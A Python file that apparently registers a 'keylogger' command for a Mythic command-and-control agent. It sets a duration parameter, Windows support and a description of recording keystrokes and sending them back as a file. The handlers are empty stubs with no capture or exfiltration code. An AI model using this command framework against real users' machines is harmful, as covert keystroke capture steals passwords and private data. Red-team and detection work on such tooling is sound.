from mythic_container.MythicCommandBase import *
import json

class KeyloggerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="seconds",
                type=ParameterType.Number,
                description="Number of seconds to record keystrokes",
                parameter_group_info=[ParameterGroupInfo(
                    required=True
                )]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply the number of seconds to record keystrokes")
        self.add_arg("seconds", self.command_line)

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class KeyloggerCommand(CommandBase):
    cmd = "keylogger"
    needs_admin = False
    help_cmd = "keylogger <seconds>"
    description = "Record keystrokes for X seconds, send the result as a downloaded text file"
    version = 1
    supported_ui_features = []
    author = "@Rafity"
    argument_class = KeyloggerArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
        suggested_command=False
    )
    attackmapping = []

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp